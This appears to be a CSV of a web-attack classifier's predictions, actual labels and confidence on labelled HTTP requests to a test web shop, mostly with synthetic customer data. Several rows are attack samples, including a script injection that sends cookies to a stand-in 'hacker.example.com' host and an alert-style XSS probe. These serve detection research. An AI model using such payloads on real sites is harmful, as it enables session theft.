Prediction, Actual, Confidence, Method, Content, URL
1, 1, 81.31%, POST, modo=insertar&precio=916&B1A=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1, 0, 55.41%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=raudres&pwd=s%21u2ceP7ivo&remember=off&B1=Entrar HTTP/1.1
0, 0, 84.90%, POST, B2=Vaciar+carrito, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1, 1, 75.34%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gamaleld&password=t54p-4l&nombre=Shunko&apellidos=Volta+Piriz&email=st%40reep%40accesoa%40bierto.%40qa&dni=78789686N&direccion=Menorca+13%2C+2%3FH&ciudad=Villagonzalo&cp=31495&provincia=Granada&ntc=4253253341921904&B1=Registrar HTTP/1.1
0, 0, 99.36%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1, 1, 71.38%, POST, modo=registro&login=tsern&password=S87abOC9do4&nombre=Nadir&apellidos=Ganci+Zanuy&email=randall%40barnicesultravioleta.tel&dni=01364603J&direccion=Carrer+Sant+Antoni%2C+S%2FN+&ciudad=Torre+del+Bierzo&cp=33780&provincia=Ourense&ntc=6172384858877900&B1A=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 93.26%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=18&B1=A%F1adir+al+carrito HTTP/1.1
1, 0, 50.07%, POST, modo=insertar&precio=8201&B1=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 84.04%, POST, modo=entrar&login=nelon&pwd=EquIN57erMo&remember=off%2F&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 99.92%, GET, , http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
1, 1, 61.52%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1859%252B&B1=Confirmar HTTP/1.1
1, 1, 95.95%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp/4861362529278789730 HTTP/1.1
0, 1, 53.23%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%257C HTTP/1.1
0, 0, 93.83%, POST, errorMsg=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0, 0, 99.47%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0, 0, 57.96%, POST, modo=registro&login=brunhild&password=te3496&nombre=Andr%F3cies&apellidos=Martin%F3n+Sampayo&email=allaert%40chicasdiabolo.ru&dni=63974696N&direccion=Calle+Plantio%2C+178%2C+&ciudad=Fla%E7%E0&cp=50629&provincia=Navarra&ntc=8099861085079421&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 98.79%, GET, , http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1, 1, 100.00%, POST, id=3&nombre=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&precio=85&cantidad=32&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 93.83%, POST, errorMsg=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 1, 66.24%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=%252B&nombre=Queso+Manchego&precio=100&cantidad=65&B1=A%F1adir+al+carrito HTTP/1.1
1, 1, 98.36%, POST, modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=cassondr&password=I658CT8&nombre=Alcides&apellidos=Cabanilla+Dumenj%F3&email=odermar%40cafedeteatro.tj&dni=57363582H&direccion=Calle+General+Sanz+Pastor+139+6C&ciudad=Vila+de+Cruces&cp=06185&provincia=Ja%E9n&ntc=3802015475330512&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 0, 75.84%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hoog&password=rom87231o&nombre=Rider&apellidos=Orero+Mallofr%E9&email=yoyce%40atrioregalos.eu&dni=80788346H&direccion=C%2F+El+Salvador+199%2C+9-A&ciudad=Vegas+del+Genil&cp=46841&provincia=Zamora&ntc=2680573956820155&B1=Registrar HTTP/1.1
0, 0, 95.17%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
0, 0, 99.92%, GET, , http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
0, 0, 98.35%, GET, , http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
1, 1, 68.59%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maupin&password=pu552lmen34&nombre=Ta%EDs&apellidos=Yepes+Vall&emailA=sova%40tarifasdevuelos.ml&dni=74740920M&direccion=Lanzarote%2C+37+&ciudad=Cat%ED&cp=25403&provincia=Zamora&ntc=3946035396869059&B1=Registrar HTTP/1.1
1, 0, 72.67%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=blondell3&password=apotrerar&nombre=Mar%EDa+Candela&apellidos=Moch%F3n+Quer&email=peller%40arvigar.gs&dni=30503437D&direccion=Carrer+Asturies%2C+49+&ciudad=Santa+Fe+de+Mond%FAjar&cp=49135&provincia=Santa+Cruz+de+Tenerife&ntc=8582534834926521&B1=Registrar HTTP/1.1
